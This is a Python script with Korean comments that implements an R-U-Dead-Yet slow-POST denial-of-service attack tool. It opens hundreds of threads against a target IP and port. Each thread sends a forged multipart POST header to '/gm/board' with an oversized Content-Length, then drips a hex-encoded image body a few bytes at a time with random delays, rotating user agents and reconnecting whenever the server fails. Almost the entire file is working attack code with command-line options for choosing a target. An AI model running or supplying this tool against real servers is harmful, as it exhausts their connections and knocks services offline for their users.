# 원본 코드 https://m.blog.naver.com/stop2y/221018093734

import time
import random
import socket
import string
from threading import Thread
from random import randint
import argparse
import sys


class http_rudy(Thread):
    def __init__(self, host, port,min,max):
        Thread.__init__(self)
        self.host=host
        self.port=port
        self.min=min
        self.max=max
        self.intercount=0
        self.running=True
        #변수 초기화
    def run(self):
        while self.running:
            try:
                self.intercount+=1
                print('One Thread send Packet Count :'+str(self.intercount))
                #소켓 생성
                self.socks=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                #소켓 목적지 host와 연결
                self.socks.connect((self.host,self.port))
                payload = self.prepare_payload()
                # 작성된 HTTP 패킷 전송
                self.socks.send(payload)
                
                #Image 파일의 HEX ( 기능 수정 가능 : 이미지파일의 업로드를 통해 원하는 이미지의 값을 넣을 수 있습니다. )
                self.img='5BA82222A2A60170D1855C41CC54FA9448AB52A12B63317985C8B98209C408059729589550D3884BAA9519714453DA150E23B92719DCBAEEE0EEA59F332B28352E3989998B087115164534650D423DB0A730B92885BC1B781EA02AEA397129926660A332596ACA0A9922A6A639B5A87C00418972044DDCAB0C5599EE062352A5C4C9086B896C588A5E2510688B1304338DA7793163E22ADA9CA9659466A257115B53F7C40A948CCD3266413211CA425C5CC4CC0B03E655430C4E272A01865D753EFA2AD42BA8FC3C0A172C334198B446502E986A6330B81482E12A82C23832B83A5B0EAFC6F44DA88C2C62593760D20814CAEA504BE639719B42E6A0308B530E62011046B5B88600941957302F7A8020D771711BD46DD003DC2B71500D910C9A822DB62F0996E6494B2A99884C4EE97980A9612C33B9F2475155C2DC4EA2B8C37E00A8E0B2EA8A2022C6237B94DCB199E51DA0E521B8E17788FC31474C770DC166F7118710C54C466E0A810AAE21F698C4C7115C0831364AE60512950E65ACC7080554AD246F0FB81826CEA2CD9A8198AA1A4692E4633C405D41CB26A5445B30F48A8941B99731F7963502C6529615C23C32E88BF73720ED810BE2004C7C2EA0B16730408C4C5718A8B551C661D9E151026F0E646CCC91C3199E25352CE932C84521B2E09AEBC44C1205DCA790416A16D4CB3B48C6D63DD98EF5CE30C407308D0BEA01188AE25D14B8468521AA837E17342334A28C2D8663098A873337862E206206667E1CCF1A985DCC211E3161B96AF51A312E17C225A437186525B1AE02D54BF116AB8A8BEA526A65C4B468D455B8E5A9690CB30C5C4BBE21A477550B30B62529B419F53116A608B325B32CC6A2250CA602604C301122373267C15C08DF116E1817610152825FA3C4917530B9918B52F134750DB752DB4A202A2C3123BF00EA60CCBA9412C8C1536CC17C3559E14B8A9898833998B1303C554C290730BD4B418783295CCD61B469772820A6595712B5988B1106E3B2BF30B6D9990B751FC5CD8A6546A25911DAC40098803B46262365729935094B83105952C282A8E11AA5AC99130811313058A1CD92BB86D814422EA399926185730C780CC72ED2266297528098A3348482BC16C342E05EA27A89750F583A951A954A959430C23DC57A8670C1974E899F5304A2EBCB847286A2BE0EC942345897E2AB3288A84BF05DE20C40A95641C542600650311CC309544C0C4B662B912B5DC61934E615098264A9AA937731DB98F88A1866774ED2CB9822CE6511AFBCC90A5B1066152E942B31E258F3035705CB8A0CC5A954784729701DC292F260609632C2A1E85910E772CB180A94906B14229B24259200688DDBA9D84B5553A932620BC780189A12EF710B7C02693030732E78193C5B7162C2E0B2159582062332C4C90812AAFA955F103534432C3DCBEE61C4C4D4B21066F15620D43AC4030456A12529E1DF16F514F886A66A648C63884C4DB0C7855A9A9412E62F07A3C278ED656CAA310A91973A8C3304DB5117E00F143E150C44ACC1E612152C1F515CC961624A9B267B98A0329B8EED2C84B19540A731609A4A985A6C97DF81D5732EE0B9EC44CC2C8E304A4AB96B1B92D6A6A84C4207E6586E384A1D42F156354BAE284B63B35313129D2232B96E894BD42AD5301A3B82101D13071062986530733ACB8E3C3978638910DC7364DB112EA6B083C6C189AFA85595033A97F80590A30315288618227865D4B2040D254A14996E5AC690972897FC40A95EE0438152952EB96ACAEE8959A81371C5123C90260DCDF51F71C21CC944B9B8D446DC182980B21CCA060E6A5235D4C20A2A66BD4CA624DA2632C76AA14CCAB8CB9CC5CC17294C2AD4CCD474CCCF3311C916EE1422AF70590970620A25E22CA610F85F10F24DA540B8C33A83167EC950625840A7128C1A8AE0A4D62150735E3A43598A7E599CCBA9AB1083C5B7134D4AB352C2648D21B47D23DE7C41D4AA8E2BDCDC30C6FC61512E0A4E8F08710208C0E6017DC6D080BD40B26040B5C440B9B86B336952A6114A9B44B8AE104AB8451C8B52EE9828C39F1826E3B97CDB3D312384130D4DFDC0C44B86798940987C036A5157052621899A6384D92D72C852A05130B8F316E222BD41DCEB2FB6A5BA94F11F5121B8733BA60626825932C204C699712DD25F88B314584D2711D4C60CC4B2300662A66C8F104AC928898F09826D1C3065F824D44B9A4E20CCACCE4862620C4C90EE0DC2B850510113B80A83286A26E7241B958619599598999A5F81838F88E71109A830BCC0C459F1108A89BF06D2AE1025B983999914311592A04753381CC7044E25F8886D94B9873E2E20C499D44A40B95982DF8C92C4130669015384588A080B98436E30DB83A83A96B8D77304A2156A3312DE0328AEE6F045310D18818881A3C6AE0B6015184DC5B6A05136A97516D8B102CB9FFFD9'
                hex_img = self.split_data_random(self.img,self.min,self.max)
                # 실제 공격의 시작
                for data in hex_img:
                    self.socks.send(bytes.fromhex(data))
                    # 요청 간 1~4초 사이의 실수형 랜덤값으로 휴식
                    time.sleep(random.uniform(1,4))
                self.socks.close()
                self.run()
            except socket.error:
                print('Connection error OR Server Down....Retrying...')
                time.sleep(random.uniform(1,3))
                self.run()
                
    def prepare_payload(self):
        user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]
        payload1=bytes("POST /gm/board HTTP/1.1\r\n",encoding='utf-8')
        payload2=bytes("Host: {} \r\n".format(self.host),encoding='utf-8')
        payload3=bytes("Content-Length: 2767194\r\n",encoding='utf-8')
        payload4=bytes("Cache-Control: max-age=0\r\n",encoding='utf-8')
        payload5=bytes("Upgrade-Insecure-Requests: 1\r\n",encoding='utf-8')
        payload6=bytes("Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRfya0hLXgc3BiyNi\r\n",encoding='utf-8')
        payload7=bytes("User-Agent: {}\r\n".format(random.choice(user_agents)),encoding='utf-8')
        payload8=bytes("Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n",encoding='utf-8')
        payload9=bytes("Referer: http://{}:{}/gm/board_write.php?boardIndex=4\r\n".format(self.host, self.port),encoding='utf-8')
        payload10=bytes("Connection: keep-alive\r\n",encoding='utf-8')
        payload11=bytes("Keep-Alive: 900\r\n",encoding='utf-8')
        
        payload = payload1 + payload2 + payload3 + payload4 + payload5 + payload6 + payload7 + payload8 + payload9 + payload10 + payload11
        return payload
        
        

    def split_data_random(self,hex_data,min,max):
        chunks = []
        i = 0
        self.min = min 
        self.max = max 
        while i < len(hex_data):
        # 1~3 바이트를 선택하고 Hex 문자열에서의 길이(2배)를 계산
            # 실제 바이트 크기
            byte_size = randint(self.min, self.max) 
            # Hex 문자열에서의 길이는 바이트 크기의 2배
            hex_size = byte_size * 2 
            chunks.append(hex_data[i:i+hex_size])
            i += hex_size
        return chunks
    
# 공격파일 설명
def arg_userage():
    print("Rudy.py ")
    print(" -i | --tartget IP hostname|IP")
    print(" -p|--port Default 80")
    print("-t|--threads Default 256")
    print(" -h|--help Shows\n")
    print("Ex, Python3 Rudy.py -i IP -p Port -t Threads \n")
    print("Now Starting Attack..")
    start_time = time.time()
    print("Start Time : " + time.ctime(start_time))
    end_time = start_time + 5 
    count = 5
    while time.time() < end_time:
        time.sleep(1)
        count -= 1
        print(f"{count}")
    print("Start Attack")

# 사용자가 입력한 값 파싱 (argparse)
def parse():
    parser = argparse.ArgumentParser(description="R-U-Dead-Yet Tool")
    parser.add_argument('-i',type=str,help='--target Target IP HOSTNAME | IP',required=True)
    parser.add_argument('-p',type=int,help='--port Target PORT Default 80',default=80)
    parser.add_argument('-t',type=int,help='--threads Number of THREAD Default 256',default=256)
    parser.add_argument('-min',type=int,help='--min bytes default 1',default=1)
    parser.add_argument('-max',type=int,help='--max bytes default 3',default=3)
    args=parser.parse_args()
    return args

if __name__=='__main__':
    args=parse()
    arg_userage()
    # min 값이 max값보다 크면 종료합니다.
    if args.min > args.max:
        print(f"Error: Min {args.min}bytes가 Max {args.max}bytes보다 큽니다.\n다시입력해주세요.")
        sys.exit(1)
    # 사용자 입력 IP 값
    if args.i:
        host=args.i
    # 사용자 입력 PORT 값
    if args.p:
        port=args.p
    # 사용자 입력 Thread 값
    if args.t:
        threads=args.t
    if args.min:
        min = args.min
    if args.max:
        max = args.max
    
    for rudy in range(threads):
        rudy = http_rudy(host,port,min,max)
        rudy.start()
        
